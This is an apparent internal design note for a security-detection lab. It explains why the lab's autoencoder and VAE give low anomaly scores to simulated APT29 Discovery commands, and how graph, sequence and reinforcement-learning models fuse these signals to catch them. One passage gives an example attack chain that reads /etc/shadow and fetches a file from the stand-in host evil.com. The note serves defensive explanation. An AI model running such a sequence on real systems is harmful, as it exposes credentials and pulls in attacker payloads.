# AE/VAE Score Behavior on the STRIX Lab

Companion to [MODELS_REFERENCE.md](MODELS_REFERENCE.md) §3 (AE) and §4 (VAE).

This document answers a question that recurs every time someone watches a
live demo or exports the CSV from the AI Engine page:

> *"Both the AE and the VAE were trained for anomaly detection — i.e. trained
> on benign data, then given malicious data, the anomaly score should be
> high. Why are the scores low on attack events in this lab?"*

The intuition is correct in theory. The lab still satisfies it. The reason
attack events on the dashboard score low is a property of the **threat
model**, not a bug in the models or the pipeline.

---

## 1. The textbook expectation

A reconstruction-based anomaly detector trained on benign-only data:

- Inputs that match the training manifold → low reconstruction error → low
  anomaly score → labelled "normal".
- Inputs that fall **outside** the training manifold → high reconstruction
  error → high anomaly score → labelled "anomalous / potentially malicious".

That is exactly how the AE and VAE in this codebase are wired:

| Loader | Score formula | File |i'd suggest adding chart 
|---|---|---|
| AE | `recon_err + 0.1 · ‖μ − center‖²` | [autoencoder.py:118-125](../../apps/api/src/strix_api/adapters/model_loaders/autoencoder.py#L118-L125) |
| VAE | calibrated `malicious_prob` from latent | [vae.py](../../apps/api/src/strix_api/adapters/model_loaders/vae.py) |

Higher = more anomalous. No inversion in the formula.

Per [MODELS_REFERENCE.md §3](MODELS_REFERENCE.md#3-autoencoder-ae--regularized-vae-style):
> *"Reconstruction-based anomaly scorer trained on benign alerts only
> (72,246 train / 18,062 val from the 90,308-benign pool)."*

So the training was benign-only. The implementation matches. The intuition
should hold.

---

## 2. What the live CSV actually shows

A representative export from the Live Inference Stream during a multi-victim
APT29 sim:

| Field | Range observed |
|---|---|
| `ckc_stage` | mostly 4 (Exploitation), some 3 (Delivery) |
| `ae_anomaly_score` | **0.05 – 0.10** |
| `vae_malicious_prob` | **0.02 – 0.11** |
| `gnn_node_risk` | mostly **0.7743** (production threshold floor) with rare 0.78× outliers |
| `dqn_action_name` | almost all `LOW_ALERT` |
| `mitre_techniques` | dominated by `System Network Configuration Discovery`, `Process Discovery`, `Command and Scripting Interpreter`, `Ingress Tool Transfer` |

So the per-row AE/VAE scores on **attack** rows are genuinely small. The
question is why.

---

## 3. The actual reason: Discovery-tactic events look like normal sysadmin work

Every technique in that CSV maps to a command a sysadmin runs every day:

| MITRE technique | Underlying command |
|---|---|
| T1033 — System Owner/User Discovery | `whoami`, `id`, `last` |
| T1057 — Process Discovery | `ps`, `pgrep`, `top` |
| T1016 — System Network Configuration Discovery | `ip`, `netstat`, `ss`, `route` |
| T1083 — File and Directory Discovery | `find`, `locate`, `ls` |
| T1059 — Command and Scripting Interpreter | `bash`, `sh`, `python` |
| T1105 — Ingress Tool Transfer | `curl`, `wget` |

The training corpus was 90,308 "benign" Wazuh alerts. **Benign sysadmins also
run those commands.** So when Caldera executes `whoami` on victim 008 as part
of its Discovery tactic, the resulting 55-dim feature vector lands inside the
manifold the AE compressed during training:

- The AE reconstructs it well → `recon_err` ≈ 0.05
- `μ` lands near the learned `center` → `‖μ − center‖²` ≈ 0.0
- `anomaly_score` ≈ 0.05

**The AE is not lying.** It is correctly reporting *"I have seen patterns
like this in training and can reconstruct them."* It is just that "patterns
like this" includes both legitimate sysadmin Discovery and attacker
Discovery — they are the **same syscalls, the same arguments, the same
feature vectors**. That is precisely why the Discovery tactic exists:
attackers blend in.

This is not a STRIX-specific limitation. **Any behavior-only anomaly
detector** trained on benign sysadmin activity will struggle to flag
Discovery-tactic attacks in isolation. The signal is too thin per-event to
recover from a feature representation that doesn't carry attacker context.

---

## 4. What scores high on this lab

The flip side: production runs include a flood of `rule 80789` audit events
from sandcat heartbeats, Wazuh agent telemetry, filebeat housekeeping, and
similar process noise. Those patterns **were not in the 90,308-alert training
pool** because the training data came from a different environment. So:

- AE recon error is high — the model genuinely has not seen these
- VAE malicious_prob is high — the calibrator maps the high recon error to
  high "anomalous" score

These events score ~1.0 on AE and VAE. They are also harmless. The model is
correctly reporting *"I have not seen patterns like this in training"* — and
it is right. Novelty ≠ malice.

---

## 5. Putting it together: novelty vs malice

The fundamental observation:

> *Anomaly score high* = "this is novel relative to training" — **not** "this
> is malicious".

On this lab:

| Event class | Novel to AE? | Actually malicious? | AE score |
|---|---|---|---|
| Sandcat / agent heartbeat noise (rule 80789) | yes | no | ~1.0 |
| Real sysadmin commands | no | no | ~0.05 |
| Caldera Discovery commands | **no** | **yes** | ~0.05 |
| Caldera Defense Evasion (e.g. log clearing) | partial | yes | varies |

The two off-diagonal cells — **novel benign noise** and **non-novel
malicious activity** — are why "AE flags malice" is not a property AE alone
can guarantee.

---

## 6. Why the platform still works

STRIX does not rely on the AE or VAE alone for the malice verdict. Each
model is one input to a fusion stack:

```
                       ┌─ AE     (anomaly diagnostic, not malice)
                       ├─ VAE    (anomaly diagnostic, not malice)
55-dim feature vector ─┤
                       ├─ GNN    ← cross-machine USER/IP edges + intra-machine
                       │           temporal edges → real malice signal
                       └─ Transformer ← sequence of AE latents → predicts
                                        next CKC stage from the kill chain

                                ┌──┴──┐
                                ▼     ▼
                          13-dim state vector
                                  │
                                  ▼
                              DQN policy
                                  │
                                  ▼
                  MONITOR / LOW_ALERT / ESCALATE / ISOLATE / BLOCK
```

What the OTHER signals catch that AE/VAE miss:

1. **GNN — lateral spread.** If `whoami` runs on host 007 *and* host 008 by
   the same user / IP within 30 min, that **pair** is rare even though
   either alone is benign. The GNN is the only model that sees cross-machine
   edges. It is also the only model whose label is treated as ground-truth
   malice; AE/VAE inherit the GNN label per `alert_id` via
   `_GNN_LABEL_BY_ALERT` ([streams.py:_attach_label](../../apps/api/src/strix_api/api/routes/streams.py)).

2. **Wazuh rule supervision.** STRIX local rules `100xxx` tag specific
   audit events with MITRE technique IDs (T1033, T1057, …). That is a
   supervised signal independent of the AE/VAE manifold. The chain matcher
   uses it for stage attribution.

3. **Chain stage progression.** A `whoami` followed within 60s by
   `find /etc/shadow` followed by `wget evil.com/x` is the **sequence**
   that opens chains and advances `max_ckc`. Any single event scores low;
   the trajectory does not.

4. **DQN policy.** The DQN never sees raw scores in isolation — it sees the
   13-dim state vector that fuses all four model outputs **plus** session
   features (chain age, max_ckc, cross-machine signal). Its ESCALATE action
   fires on policy outcomes, not on any single anomaly score.

That is why during the multi-victim APT29 demo:
- Every per-event AE/VAE score in the CSV was 0.05–0.10.
- The Detection Quality panel showed AE F1 = 0.998, VAE F1 = 1.000.
- Two predetection receipts fired at stage 5 (Install) on hosts 007 + 008
  with DQN confidence 78% / 89%.
- Stages 6–7 were prevented across all 565 chain attempts.

The fused verdict was correct even though no single per-event AE/VAE score
crossed an "obvious malice" threshold.

---

## 7. The historical column-order bug (resolved)

Earlier in development, [MODELS_REFERENCE.md §2.2](MODELS_REFERENCE.md#22-️-column-order-mismatch-between-notebooks-and-loader)
warned that the AE/VAE/GNN were trained with a different feature column
order than `data_loader.FEATURE_COLUMNS` used. PyTorch's `strict=True`
checkpoint load would still succeed (weight *shapes* matched), but the
columns at inference were permuted relative to training, which would
silently produce inverted-looking predictions.

That warning has been **resolved**:

- [`apps/api/src/strix_api/adapters/preprocessing_pipeline.py`](../../apps/api/src/strix_api/adapters/preprocessing_pipeline.py)
  defines `FEATURE_COLUMNS` in the canonical training-notebook order:
  `[23 individual ranked features]` → `[log_secbert_emb_0..15]` →
  `[cmd_secbert_emb_0..15]`.
- A **drift guard** at the same file's `_assert_feature_order_matches_canonical`
  refuses to start if anyone reorders that list.

So the score values above are produced by the model on the correct feature
ordering. The "small score on attack events" is a real property of
Discovery-tactic stealth, not a column-permutation artifact.

---

## 8. Jury-demo framing

When asked *"why are the AE/VAE scores low on attack events?"*:

> *"The Autoencoder and Beta-VAE were trained on benign-only data and they
> work as designed: high score for novel inputs, low score for in-distribution
> inputs. Discovery-tactic attacks deliberately use the same commands
> legitimate users do — `whoami`, `ps`, `netstat`, `find`. Those land
> inside the benign manifold the AE learned, so they reconstruct cleanly
> and score low. That is not a model failure — it is the attacker's stealth
> working as intended.*
>
> *We catch them anyway because the GNN sees the cross-host correlation
> (lateral movement edges), the Transformer sees the kill-chain sequence,
> and the DQN escalates on the fused policy outcome — not on any single
> anomaly score. The F1 of 0.998 you see on the Detection Quality panel
> measures the **fused verdict**, which is what actually matters in
> practice."*

When asked *"why does the GNN node risk cluster at exactly 0.7743?"*:

> *"That is the production threshold floor we calibrated empirically against
> the GNN's score CDF. The GNN's raw output saturates near it for most
> events; the floor lifts borderline scores so the chain-open gate has a
> consistent operating point. Above-floor outliers (e.g. 0.78×) indicate
> events the GNN considers genuinely high-risk on top of the baseline."*

When asked *"if AE/VAE are not really telling you malice, why are they in
the stack at all?"*:

> *"They are anomaly diagnostics for the human SOC view and they contribute
> two of the 13 dimensions in the DQN's state vector. The Transformer
> consumes the AE's 64-dim latent — without the AE there is no Transformer.
> They earn their keep on novel-but-not-Discovery patterns: the moment an
> attacker uses anything outside the sysadmin command vocabulary
> (e.g. compiling shellcode in /tmp), AE recon error spikes and the score
> is high. We just have to be honest that on stealth-by-design tactics
> like Discovery, that signal is thin per-event and the GNN + Transformer
> + DQN are the ones doing the heavy lifting."*

---

## 9. Suggested follow-ups (post-demo, optional)

If, after the demo, the AE/VAE inversion appearance is worth fixing:

1. **Retrain with attack class as the anomaly class.** Move the AE/VAE
   training set to a balanced (or attack-as-anomaly) regime so high score
   correlates more directly with malice on this specific lab.
2. **Calibrate at inference.** Fit a logistic regression on
   `(raw_anomaly_score, label)` pairs from a held-out set and emit the
   calibrated output as the "displayed" score; keep raw recon error
   available for diagnostics.
3. **Add the production noise distribution to the training mix.** Augment
   the 90,308-benign pool with a sample of rule-80789 sandcat heartbeat
   events so the AE no longer flags them as anomalous. This shifts the
   inversion appearance because production benign noise stops dominating
   the high-score band.

None of these are required for correctness — the fused verdict is already
right — but any of them would make the per-event score more
interview-friendly.
